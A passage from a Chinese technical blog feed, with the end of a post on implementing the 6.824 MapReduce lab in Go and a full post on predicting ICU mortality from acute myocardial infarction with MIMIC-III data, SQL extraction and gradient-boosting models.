<p>论文以 wc （单词统计）为例。master会分出M个Map任务和N个Reduce任务，然后分配给worker。</p>
<p>Map任务执行用户自定义的map函数，输出一个&lt;key, value&gt;。</p>
<p>Reduce执行用户自定义的reduce函数，用来聚合相同的&lt;key, value&gt;。</p>
<p>要注意Map和Reduce是有先后顺序的，需要完成Map操作</p>
<h2 id="Lab1-实现一个玩具MapReduce"><a href="#Lab1-实现一个玩具MapReduce" class="headerlink" title="Lab1 实现一个玩具MapReduce"></a>Lab1 实现一个玩具MapReduce</h2><p>注：看起来这个Lab和去年的一样，把去年做的直接拿过来了，当时实现的时候不少地方挺粗糙的。</p>
<p>6.824的Lab1是做一个MapReduce，例子就是当年Google经典论文里面的那个 word count。wc和阶乘、求和一样有很好的性质，能够并行。</p>
<p>这个Lab很简单，<code>src/main/mrapps/wc.go</code>给好了一个单机版的例子，实现这样的效果：<code>cat mr-out-* | sort | more</code></p>
<p>仿照单机版本用rpc通信做一个并行版本就可以了。（这里没有真正的集群，用多个goroutine模拟并行）</p>
<p>我们需要补全3个文件：coordinator.go, worker.go, rpc.go。这里的coordinator就是论文里的master，因为<del>黑命贵</del>某些原因惨遭和谐，你打开以前的Lab就可以看到它本来就是master.go</p>
<p>rpc.go 里面已经给了一个例子，我们仿照着写就可以了（其实本来我是想直接用grpc来着）。注意PRC的struct要大写。</p>
<p>worker很容易，向master发送RPC请求然后接任务并返回就可以了。将Map任务分配到对应的worker中可以直接使用给好的<code>ihash</code>函数</p>
<p>master要产生并分配map任务和reduce任务，然后接收的时候判断一下是否可以合并。这里一个比较麻烦的地方是处理worker超时、停机等情况。不过这里提示我们用一个简单的方法：For this lab, have the master wait for ten seconds; after that the master should assume the worker has died (of course, it might not have). 不区分超时和宕机，直接等待10s，10s后如果没收到就直接不要这个worker的任务了。</p>
<h3 id="race问题"><a href="#race问题" class="headerlink" title="race问题"></a>race问题</h3><p>我去年做的时候是给channel加Mutex锁来保证没有race。go的风格是尽量用channel避免加锁，我试着全用channel但是更乱了，可能是我的操作不对，最后还是用了锁。</p>
<h3 id="reduce需要在每个map全部完成后再开始"><a href="#reduce需要在每个map全部完成后再开始" class="headerlink" title="reduce需要在每个map全部完成后再开始"></a>reduce需要在每个map全部完成后再开始</h3><p>Map任务和Reduce任务是不能并行的，Reduce需要等待所有Map任务完成之后才能开始。</p>
<p>之前做的时候是傻呼呼的让reduce任务的节点发rpc给master，然后等到map完成数为M了才开始。这次翻了翻Lab的Hints，原来可以用<code>sync.Cond</code> (条件变量)，大概像下面这样</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// w.cond = sync.NewCond(w)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// master</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(w *Worker)</span></span> BeginReduceWork &#123;</span><br><span class="line">    w.cond.L.Lock()</span><br><span class="line">    <span class="keyword">if</span> &#123;</span><br><span class="line">        all_map_task_finish <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">    w.cond.L.Unlock()</span><br><span class="line">    w.cond.Broadcast()   <span class="comment">//广播，开始每一个Reduce任务</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//worker</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(w *Worker)</span></span> doReduce &#123;</span><br><span class="line">    w.cond.L.Lock()</span><br><span class="line">    <span class="keyword">for</span> !all_map_task_finish &#123;</span><br><span class="line">        w.cond.Wait()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// start Reduce Task</span></span><br><span class="line">    w.startReduce()</span><br><span class="line">    w.cond.L.Unlock()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>sync.Cond</code>这个讨论串挺有意思的<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2dvbGFuZy9nby9pc3N1ZXMvMjExNjU=">proposal: Go 2: sync: remove the Cond type<i class="fa fa-external-link-alt"></i></span>。</p>
<h3 id="写入的原子性"><a href="#写入的原子性" class="headerlink" title="写入的原子性"></a>写入的原子性</h3><p>Lab的提示告诉你，写入新建一个副本，然后应用更改的时候重命名</p>
<blockquote>
<p>To ensure that nobody observes partially written files in the presence of crashes, the MapReduce paper mentions the trick of using a temporary file and atomically renaming it once it is completely written. You can use ioutil.TempFile to create a temporary file and os.Rename to atomically rename it.</p>
</blockquote>
<h3 id="master挂了怎么办"><a href="#master挂了怎么办" class="headerlink" title="master挂了怎么办"></a>master挂了怎么办</h3><p>我做Lab的时候没有考虑这个问题，假设它不会挂。</p>
<p>如果真的挂了那就再来一遍吧（可以保存中间文件，这样已经产生的中间文件就不用从Map操作再产生一遍了）</p>
<h3 id="输入在变怎么办"><a href="#输入在变怎么办" class="headerlink" title="输入在变怎么办"></a>输入在变怎么办</h3><p>如果输入（比如需要wc的单词）一直在改变，这样也是不适合用MapReduce处理的。这种可以去用storm和flink。实时计算这些我也不不懂，不管了。</p>
<h3 id="网络问题和恶意篡改"><a href="#网络问题和恶意篡改" class="headerlink" title="网络问题和恶意篡改"></a>网络问题和恶意篡改</h3><p>一般我们部署在内网集群，不考虑网络带宽问题。TB级别的文件分为总文件大小除以64M的Map<br>同理假定所有节点不存在恶意篡改，也不考虑Paxos等算法考虑的拜占庭问题。</p>
<!-- 
## Push一下老板

老板给本科生讲课讲王珊《数据库系统概论》，基本就还是老一套。除了上机和作业，一半的时间在讲约束和范式，一半的课时在讲触发器、游标、存储过程，还是有两把刷子的。
好吧，老板的课我当年都没从头到尾好好听，只听了和看了书里面范式、约束、隔离级别和锁那些。老板讲的那一套用面向对象那一套建好多个表和约束、多表联结查询、逻辑都写在存储过程里面，做一个传统的金融、HIS系统那种对约束要求严格业务繁多的

不过上周组会还是出乎我的意料。老板他老人家最近又有了奇思妙想，虽然他组会上说下周找一个毕业的师兄过来给我们讲一下联邦学习的时候，一口一个大数据，啊，开始吹什么大公司都在用啊这个很有前景啊。

我一脸懵，联邦学习是什么？
老板：巴拉巴拉....
我：这不就跟MapReduce那一套东西差不多
老板：MapReduce是什么？
我：巴拉巴拉
老板：不是的，不是这个东西

老板大概是多年没有亲自写过代码了，技术水平和概念还停留在sql server 2000、Oracle那一堆逻辑写在存储过程里面和上个世纪在金蝶公司用C++写图形界面。（**年轻帅气的老板在写代码的时候我甚至还没有出生**，Google经典三篇发布都已经是零几年的事了，当时老板做的东西也还是Oracle单机那一套，没听过可能也正常）

咳咳，不黑老板了
老板你要是看到我这篇博客，少玩点手机啊，看看DDIA吧
 -->


<h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p> GFS的经典论文</p>
]]></content>
      <categories>
        <category>Concurrency&amp;Go</category>
      </categories>
      <tags>
        <tag>MapReduce</tag>
        <tag>6.824</tag>
      </tags>
  </entry>
  <entry>
    <title>基于机器学习的ICU急性心肌梗死死亡率预测（MIMIC数据库）</title>
    <url>/morality-prediction/</url>
    <content><![CDATA[<p>更新：推荐使用新版的MIMIC数据库自行构建数据集，并尝试整合eICU的病人数据。据说LSTM等方法效果不错，可以试试。<br>处理过程已经放在github上了：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0FyY2hhZW9yYXB0b3IvQU1JX21vcmFsaXR5X3ByZWRpY3Rpb24uZ2l0">https://github.com/Archaeoraptor/AMI_morality_prediction.git<i class="fa fa-external-link-alt"></i></span></p>
<span id="more"></span>

<p>急性心肌梗死的发病率和死亡率都很高，MIMIC里面大概有5000次记录，用来构造数据集效果会比较好，这次就用MIMIC数据库里面的急性心肌梗死进行死亡风险的预测。</p>
<p>早期心血管疾病采用TIMI（the Thrombolysis in Myocardial Infarction）风险评分、全球急性心脏事件注册表（GRACE）评分或医生经验判断。后来MIMIC、eICU等开放医学数据库的建立和公布，数据量足够支撑起机器学习，疾病风险预测逐渐开始采用机器学习等方法。<br>数据清洗和构造数据集</p>
<p>目前开源的ICU重症数据库主要有MIMIC和eICU；eICU里面的患者数量多一点，但是貌似数据缺失很多，数据质量也不太好（eICU整合了几家不同医院的临床记录拼凑出来的数据库，数据质量参差不齐）</p>
<p>这里我用的MIMIC-Ⅲ数据库，内有近四万名成年人以及七千多名新生儿的五万余次住院资料，其中急性心肌梗死入院记录大概5000多次。</p>
<h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><p>前一阵MIT发布了 MIMIC IV 数据库（第四版），MIMIC-IV目前是0.4版本，以后要放出1.0正式版。希望大家下载最新版本进行训练<del>炼丹</del></p>
<p>0.4版的压缩包有6.7G,要获取需要在网站注册帐号并进行考试答题，然后同意他们关于医学伦理的条款<br>下载地址： <span class="exturl" data-url="aHR0cHM6Ly9waHlzaW9uZXQub3JnL2NvbnRlbnQvbWltaWNpdi8wLjQv">https://physionet.org/content/mimiciv/0.4/<i class="fa fa-external-link-alt"></i></span><br>并没有BT种子之类下载方式，下载需要帐号验证，由于版权和隐私等原因，应该也不能进行二次分发<br>所以大家自己去下吧。</p>
<p>通过考试答题后就直接点下载链接就好了。<br>官网还提供了wget的下载方式，安装包有点大，我们打开bbr下载会快一点（有美国代理记得挂）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo sysctl net.ipv4.tcp_congestion_control=bbr</span><br></pre></td></tr></table></figure>

<p>然后填你的用户名和密码就好了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget -r -N -c -np --user username --ask-password https://physionet.org/files/mimiciv/0.4/</span><br></pre></td></tr></table></figure>

<p>下载好建库的时候记得建索引，不然后续操作会很慢</p>
<h2 id="患者筛选"><a href="#患者筛选" class="headerlink" title="患者筛选"></a>患者筛选</h2><p>在MIMIC数据库中提取ICD-9疾病编号为410大类、疾病名称为 acute myocardial infarction的相关病人全部住院记录。数据表DIAGNOSE_ICD中的ICD9_CODE字段记录了患者的ICD-9编码，其中410大类编码根据发病部位被分为10个小类，例如第1个小类代表发病部位为前外侧壁、第2个小类代表发病部位为下外侧壁；这10 个小类又根据发病时期分为3个小类，0代表未细分，1代表初次入院，2代表再入院；例如，MIMIC数据库中ICD9_CODE字段为41031，对应的ICD-9编码为410.3.1，其中410代表急性心肌梗死，3代表下后壁，1代表初次入院。<br><img src="/%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96%E6%B5%81%E7%A8%8B.svg" alt="数据提取示意图"></p>
<p>提取到的除后续照顾类别以外的410大类患者数据中，共有5087次入院记录，去除同一患者重复的入院记录，共有4788名病人患有急性心肌梗死（包括同时患有急性心肌梗死的并发症），其中有727人死亡，总死亡率15.18%。男性患者共2924名，平均年龄为67.2岁，死亡391人，男性死亡率13.37%；女性患者共1864名，平均年龄为73.4岁，死亡337人,女性死亡率18.10%。统计急性心肌梗死患者人群种族信息，可以发现亚裔只有74次入院记录。<br>特征选取</p>
<p>MIIMC里面能用的特征大概有性别年龄这些个人信息、心率血压这些生理指标、还有些用药记录之类的，为了预测患者初次发病的死亡率，只采用患者初次入院24小时内的记录检查项目作为预测指标</p>
<p>先把24小时ICUSTAY_ID选出来</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> k_AMI2 <span class="keyword">AS</span></span><br><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">  ADMISSIONS.SUBJECT_ID,</span><br><span class="line">  ADMISSIONS.HADM_ID,</span><br><span class="line">  ADMISSIONS.ADMITTIME,</span><br><span class="line">  ADMISSIONS.DEATHTIME</span><br><span class="line"><span class="keyword">FROM</span></span><br><span class="line">  ADMISSIONS,</span><br><span class="line">  (</span><br><span class="line">    <span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span></span><br><span class="line">      A.SUBJECT_ID,</span><br><span class="line">      <span class="built_in">MAX</span>(A.ADMITTIME) ADMITTIME</span><br><span class="line">    <span class="keyword">FROM</span></span><br><span class="line">      ADMISSIONS A,</span><br><span class="line">      DIAGNOSES_ICD B</span><br><span class="line">    <span class="keyword">WHERE</span></span><br><span class="line">      A.HADM_ID <span class="operator">=</span> B.HADM_ID</span><br><span class="line">    <span class="keyword">AND</span> (</span><br><span class="line">      ICD9_CODE <span class="operator">=</span> &quot;41000&quot;</span><br><span class="line">      <span class="keyword">OR</span> ICD9_CODE <span class="operator">=</span> &quot;41001&quot;</span><br><span class="line">      <span class="keyword">OR</span> ICD9_CODE <span class="operator">=</span> &quot;41010&quot;</span><br><span class="line">      <span class="keyword">OR</span> ICD9_CODE <span class="operator">=</span> &quot;41011&quot;</span><br><span class="line">      <span class="keyword">OR</span> ICD9_CODE <span class="operator">=</span> &quot;41020&quot;</span><br><span class="line">      <span class="keyword">OR</span> ICD9_CODE <span class="operator">=</span> &quot;41021&quot;</span><br><span class="line">      <span class="keyword">OR</span> ICD9_CODE <span class="operator">=</span> &quot;41030&quot;</span><br><span class="line">      <span class="keyword">OR</span> ICD9_CODE <span class="operator">=</span> &quot;41031&quot;</span><br><span class="line">      <span class="keyword">OR</span> ICD9_CODE <span class="operator">=</span> &quot;41040&quot;</span><br><span class="line">      <span class="keyword">OR</span> ICD9_CODE <span class="operator">=</span> &quot;41041&quot;</span><br><span class="line">      <span class="keyword">OR</span> ICD9_CODE <span class="operator">=</span> &quot;41050&quot;</span><br><span class="line">      <span class="keyword">OR</span> ICD9_CODE <span class="operator">=</span> &quot;41051&quot;</span><br><span class="line">      <span class="keyword">OR</span> ICD9_CODE <span class="operator">=</span> &quot;41060&quot;</span><br><span class="line">      <span class="keyword">OR</span> ICD9_CODE <span class="operator">=</span> &quot;41061&quot;</span><br><span class="line">      <span class="keyword">OR</span> ICD9_CODE <span class="operator">=</span> &quot;41070&quot;</span><br><span class="line">      <span class="keyword">OR</span> ICD9_CODE <span class="operator">=</span> &quot;41081&quot;</span><br><span class="line">      <span class="keyword">OR</span> ICD9_CODE <span class="operator">=</span> &quot;41090&quot;</span><br><span class="line">      <span class="keyword">OR</span> ICD9_CODE <span class="operator">=</span> &quot;41091&quot;</span><br><span class="line">      <span class="keyword">OR</span> ICD9_CODE <span class="operator">=</span> &quot;41002&quot;</span><br><span class="line">      <span class="keyword">OR</span> ICD9_CODE <span class="operator">=</span> &quot;41012&quot;</span><br><span class="line">      <span class="keyword">OR</span> ICD9_CODE <span class="operator">=</span> &quot;41022&quot;</span><br><span class="line">      <span class="keyword">OR</span> ICD9_CODE <span class="operator">=</span> &quot;41032&quot;</span><br><span class="line">      <span class="keyword">OR</span> ICD9_CODE <span class="operator">=</span> &quot;41042&quot;</span><br><span class="line">      <span class="keyword">OR</span> ICD9_CODE <span class="operator">=</span> &quot;41052&quot;</span><br><span class="line">      <span class="keyword">OR</span> ICD9_CODE <span class="operator">=</span> &quot;41062&quot;</span><br><span class="line">      <span class="keyword">OR</span> ICD9_CODE <span class="operator">=</span> &quot;41072&quot;</span><br><span class="line">      <span class="keyword">OR</span> ICD9_CODE <span class="operator">=</span> &quot;41082&quot;</span><br><span class="line">      <span class="keyword">OR</span> ICD9_CODE <span class="operator">=</span> &quot;41092&quot;</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">GROUP</span> <span class="keyword">BY</span></span><br><span class="line">      A.SUBJECT_ID</span><br><span class="line">  ) <span class="keyword">AS</span> T</span><br><span class="line"><span class="keyword">WHERE</span></span><br><span class="line">  ADMISSIONS.ADMITTIME <span class="operator">=</span> T.ADMITTIME</span><br><span class="line"><span class="keyword">AND</span> ADMISSIONS.SUBJECT_ID <span class="operator">=</span> T.SUBJECT_ID</span><br></pre></td></tr></table></figure>

<p>然后用找患者检查项目、生理指标的ITEM_ID。写一个简单的SQL联接查询就可以了：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span></span><br><span class="line">  SUBJECT_ID,</span><br><span class="line">  <span class="built_in">MAX</span>(VALUEUOM) MAX_VALUE,</span><br><span class="line">  <span class="built_in">MIN</span>(VALUEUOM) MIN_VALUE</span><br><span class="line"><span class="keyword">FROM</span></span><br><span class="line">  (</span><br><span class="line">  <span class="keyword">SELECT</span></span><br><span class="line">    CHARTEVENTS.SUBJECT_ID,</span><br><span class="line">    CHARTEVENTS.ICUSTAY_ID,</span><br><span class="line">    CHARTEVENTS.CHARTTIME,</span><br><span class="line">    CHARTEVENTS.`<span class="keyword">VALUE</span>`,</span><br><span class="line">    CHARTEVENTS.VALUEUOM,</span><br><span class="line">    CHARTEVENTS.ERROR,</span><br><span class="line">    TIMESTAMPDIFF( <span class="keyword">HOUR</span>, T.INTIME, CHARTEVENTS.CHARTTIME ) STAYHOUR </span><br><span class="line">  <span class="keyword">FROM</span></span><br><span class="line">    CHARTEVENTS,</span><br><span class="line">    A_AKF_DEATH T </span><br><span class="line">  <span class="keyword">WHERE</span></span><br><span class="line">    CHARTEVENTS.ICUSTAY_ID <span class="operator">=</span> T.ICUSTAY_ID </span><br><span class="line">    <span class="keyword">AND</span> ( CHARTEVENTS.ITEMID <span class="operator">=</span> <span class="number">220546</span> <span class="keyword">OR</span> CHARTEVENTS.ITEMID <span class="operator">=</span> <span class="number">1542</span> )</span><br><span class="line">  <span class="keyword">ORDER</span> <span class="keyword">BY</span></span><br><span class="line">    CHARTEVENTS.SUBJECT_ID </span><br><span class="line">  ) AA</span><br><span class="line"><span class="keyword">WHERE</span></span><br><span class="line">  STAYHOUR <span class="operator">&lt;=</span> <span class="number">24</span> </span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span></span><br><span class="line">  SUBJECT_ID</span><br></pre></td></tr></table></figure>

<p>本次选取的急性心肌梗死患者主要特征见下表：</p>
<table>
<thead>
<tr>
<th>特征</th>
<th>字段或ITEMID</th>
</tr>
</thead>
<tbody><tr>
<td>年龄</td>
<td>PTENETS.DOD和DOB</td>
</tr>
<tr>
<td>性别</td>
<td>PATIENTS.GENDER</td>
</tr>
<tr>
<td>心率</td>
<td>CHARTEVENTS.ITEMID</td>
</tr>
<tr>
<td>入院类型</td>
<td>ADMISSION_TYPE</td>
</tr>
<tr>
<td>ICD细分编码</td>
<td>ADMISSION.ICD9_CODE</td>
</tr>
<tr>
<td>最小GCS评分</td>
<td>220739、223901、223900、198</td>
</tr>
<tr>
<td>排尿量</td>
<td>40055、226559</td>
</tr>
<tr>
<td>PaO2</td>
<td>779、220224</td>
</tr>
<tr>
<td>白细胞计数WBC</td>
<td>220546、15424、200、1127、861</td>
</tr>
<tr>
<td>体温</td>
<td>676、223762、678、223761</td>
</tr>
<tr>
<td>血钾浓度</td>
<td>50971</td>
</tr>
<tr>
<td>血钠浓度</td>
<td>50983</td>
</tr>
<tr>
<td>血胆红素浓度</td>
<td>50885</td>
</tr>
<tr>
<td>是否有血液恶性肿瘤</td>
<td>ICD9_CODE &#x3D;200XX-208XX</td>
</tr>
<tr>
<td>收缩压</td>
<td>51、220050</td>
</tr>
<tr>
<td>动脉收缩压</td>
<td>455、220179</td>
</tr>
<tr>
<td>血清尿素水平</td>
<td>51006</td>
</tr>
</tbody></table>
<h3 id="归一化和标准化"><a href="#归一化和标准化" class="headerlink" title="归一化和标准化"></a>归一化和标准化</h3><p>为了将患者特征转换成便于机器学习模型输入训练的特征变量的形式，对于MIMIC数据库中患者初次入院24小时中多次测量并记录的化验指标，选取最小值、最大值和平均值作为三个不同的特征。</p>
<p>然后对数字变量进行归一化，把标准差置为1，均值置为零（ICD细分编码之类的虽然是数字，但实际上是一个类别特征，应作为类别特征处理）</p>
<p>对于性别种族等类别特征，进行Onehot编码转换为梯度提升树模型能够接受的类型；以性别为例，将性别为女编码为01，性别为男编码为10。（LightGBM等可以用直方图算法之类的方式直接处理类别特征，不需要该操作）经过上述处理，共筛选并构建出42个急性心肌梗死患者的特征维度。</p>
<h3 id="缺失值填补"><a href="#缺失值填补" class="headerlink" title="缺失值填补"></a>缺失值填补</h3><p>由于MIMIC数据库中的数据是由两家不同的医院在10年间的ICU重症监护记录整合而成，急性心肌梗死患者的数据存在缺失和不统一的问题。以化验项目血清碳酸氢水平为例，在提取得到的4788份急性心肌梗死患者样本数据中，有4730份血清碳酸氢数据记录是完整的，有58份是缺失的，缺失率1.2%；但是部分检查指标，如收缩压，4788个样本中只有2665份完整数据，缺失率44.3%。</p>
<p>对于SVM等对于缺失值敏感的算法，用均值填补空缺数据的方法；对于缺失值不敏感的决策树类算法（如GBDT）和自带缺失值处理的算法（如XGBoost），将缺失值置为-1。</p>
<p>（缺失率在40%左右的会影响模型的效果，但是收缩压之类的又很重要，不能轻易舍弃）</p>
<p><img src="/morality-prediction/image-20200603192151696.png" alt="img"></p>
<h3 id="数据集不平衡的问题"><a href="#数据集不平衡的问题" class="headerlink" title="数据集不平衡的问题"></a>数据集不平衡的问题</h3><p>有的疾病可能会有，急性心肌梗死由于死亡率很高，正负样本比例已经超过了1：9，并不是那种极端不平衡的问题。有的疾病死亡率1%左右需要采样等方式构造平衡数据集。</p>
<h2 id="模型训练"><a href="#模型训练" class="headerlink" title="模型训练"></a>模型训练</h2><p>直接用的scikit-learn工具包，随便调了调参。决策树类的bsoosting算法表现都还不错，像GBDT啊，XGBoost啊，LightGBM啊。数据量还是有点小了，就没上深度学习那些网络。直接调sklearn的包调一下参：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="comment"># pd.options.mode.chained_assignment = None</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> lightgbm <span class="keyword">as</span> lgb</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> preprocessing</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split,cross_val_score,cross_val_predict</span><br><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> RandomTreesEmbedding, RandomForestClassifier, GradientBoostingClassifier</span><br><span class="line"><span class="comment"># criteria</span></span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> accuracy_score, roc_auc_score, f1_score,recall_score, precision_score, roc_curve</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载数据</span></span><br><span class="line">data = pd.read_csv(<span class="string">&#x27;./data/train_data_modified.csv&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">data = data.sample(frac=<span class="number">1</span>, random_state=<span class="number">42</span>)</span><br><span class="line">data_x = data.iloc[:,[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">26</span>,<span class="number">27</span>,<span class="number">28</span>,<span class="number">29</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">32</span>,<span class="number">33</span>,<span class="number">34</span>,<span class="number">35</span>,<span class="number">36</span>,<span class="number">37</span>,<span class="number">38</span>,<span class="number">39</span>,<span class="number">40</span>,<span class="number">41</span>,<span class="number">42</span>]]</span><br><span class="line"><span class="comment"># data_x = data.iloc[:,[1,2,3,4,5,6,7,36]]</span></span><br><span class="line">lbl = preprocessing.LabelEncoder()</span><br><span class="line"><span class="comment"># data_x[&#x27;M&#x27;] = lbl.fit_transform(data_x[&#x27;M&#x27;].astype(str))#将含有字符的类别特征这一列进行转换</span></span><br><span class="line"><span class="comment"># data_x[&#x27;EMERGENCY&#x27;] = lbl.fit_transform(data_x[&#x27;EMERGENCY&#x27;].astype(str))#将含有字符的类别特征这一列进行转换</span></span><br><span class="line">data_y = data.iloc[:,[<span class="number">0</span>]]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 准备一个train/test来构建模型。</span></span><br><span class="line">x_train, x_test, y_train, y_test = train_test_split(data_x,</span><br><span class="line">                                                    data_y, </span><br><span class="line">                                                    test_size=<span class="number">0.2</span>, </span><br><span class="line">                                                    random_state=<span class="number">52</span>,</span><br><span class="line">                                                    )</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(x_train.shape, x_test.shape, y_train.shape, y_test.shape)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> xgboost.sklearn <span class="keyword">import</span> XGBClassifier</span><br><span class="line">xgb = XGBClassifier(</span><br><span class="line">    n_estimators=<span class="number">100</span>,</span><br><span class="line">    learning_rate =<span class="number">0.09</span>,</span><br><span class="line">    max_depth=<span class="number">4</span>,</span><br><span class="line">    min_child_weight=<span class="number">1</span>,</span><br><span class="line">    gamma=<span class="number">0.3</span>,</span><br><span class="line">    subsample=<span class="number">0.8</span>,</span><br><span class="line">    colsample_bytree=<span class="number">0.8</span>,</span><br><span class="line">    objective= <span class="string">&#x27;binary:logistic&#x27;</span>,</span><br><span class="line">    nthread=<span class="number">12</span>,</span><br><span class="line">    scale_pos_weight=<span class="number">1</span>,</span><br><span class="line">    reg_lambda=<span class="number">1</span>,</span><br><span class="line">    seed=<span class="number">27</span>)</span><br><span class="line"><span class="comment"># xgb = HistGradientBoostingClassifier(learning_rate=0.09)</span></span><br><span class="line">xgb.fit(x_train, y_train)</span><br><span class="line"></span><br><span class="line">y_pred_xgb = xgb.predict(x_test)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">y_pred_xgb_pr = xgb.predict_proba(x_test)[:,<span class="number">1</span>]</span><br><span class="line">fpr_xgb,tpr_xgb,thresholds  = roc_curve(y_test,y_pred_xgb_pr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># y_pred_xgb = y_pred_xgb_pr &gt; 0.5</span></span><br><span class="line"><span class="comment"># print(lr.coef_) #W</span></span><br><span class="line"><span class="comment"># print(lr.intercept_) #b</span></span><br><span class="line"><span class="comment"># 评价指标</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;auc面积:&quot;</span>,roc_auc_score(y_test, y_pred_xgb_pr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;精确率:&quot;</span>,precision_score(y_test, y_pred_xgb))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;召回率:&quot;</span>,recall_score(y_test, y_pred_xgb))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;正确率:&quot;</span>,accuracy_score(y_test, y_pred_xgb))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;F1值:&quot;</span>,f1_score(y_test, y_pred_xgb))</span><br></pre></td></tr></table></figure>

<h2 id="死亡率预测"><a href="#死亡率预测" class="headerlink" title="死亡率预测"></a>死亡率预测</h2><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p>表3-3 几种机器学习方法的死亡率预测结果如下表：</p>
<table>
<thead>
<tr>
<th></th>
<th>GBDT</th>
<th>LR</th>
<th>KNN</th>
<th>SVM</th>
<th>XGBoost</th>
<th>LightGBM</th>
<th>NB</th>
</tr>
</thead>
<tbody><tr>
<td>AUC</td>
<td>0.834</td>
<td>0.780</td>
<td>0.695</td>
<td>0.779</td>
<td>0.851</td>
<td>0.844</td>
<td>0.777</td>
</tr>
<tr>
<td>精确率</td>
<td>0.676</td>
<td>0.618</td>
<td>0.5</td>
<td>0.688</td>
<td>0.690</td>
<td>0.663</td>
<td>0.378</td>
</tr>
<tr>
<td>召回率</td>
<td>0.320</td>
<td>0.239</td>
<td>0.162</td>
<td>0.155</td>
<td>0.329</td>
<td>0.330</td>
<td>0.479</td>
</tr>
<tr>
<td>准确率</td>
<td>0.879</td>
<td>0.865</td>
<td>0.852</td>
<td>0.864</td>
<td>0.875</td>
<td>0.872</td>
<td>0.806</td>
</tr>
<tr>
<td>F1 值</td>
<td>0.451</td>
<td>0.345</td>
<td>0.245</td>
<td>0.253</td>
<td>0.443</td>
<td>0.439</td>
<td>0.422</td>
</tr>
</tbody></table>
<p>看上去准确率挺高，实际结果不太好，召回率太低了。召回率的意义是真阳性率（True Positive Rate），也就是预测到的死亡患者占所有患者的比例，大概真正死亡的患者只有一半被预测了出来。</p>
<table>
<thead>
<tr>
<th></th>
<th>实际死亡</th>
<th>实际存活</th>
</tr>
</thead>
<tbody><tr>
<td>预测死亡</td>
<td>真阳性（TP）</td>
<td>假阳性（FP）</td>
</tr>
<tr>
<td>预测存活</td>
<td>假阴性（FN）</td>
<td>真阴性（TN）</td>
</tr>
</tbody></table>
<p>由于数据集还是太小，就没有细分搞成多分类的问题预测一下短期（30天）和长期（90天以上）死亡率，数据集大了可以做一下。数据集再大可以做细分，比如STEMI和NSTEMI的细分或者</p>
<h3 id="ROC曲线"><a href="#ROC曲线" class="headerlink" title="ROC曲线"></a>ROC曲线</h3><p><img src="/morality-prediction/image-20200531203632378.png" alt="几种机器学习方法的ROC曲线"></p>
<h3 id="特征权重"><a href="#特征权重" class="headerlink" title="特征权重"></a>特征权重</h3><p>以GBDT为例，提取训练模型的决策树权重，结果如图3-3所示。由图可知，梯度提升树模型认为最重要的10个指标为当日最小血清碳酸氢水平、平均动脉血二氧化碳分压、平均排尿量、心率范围、最小心率、肌酐、体温范围、当日最大收缩压、当日心率标准差、年龄。</p>
<p><img src="/morality-prediction/image-20200531210528257.png" alt="GBDT的特征权重"></p>
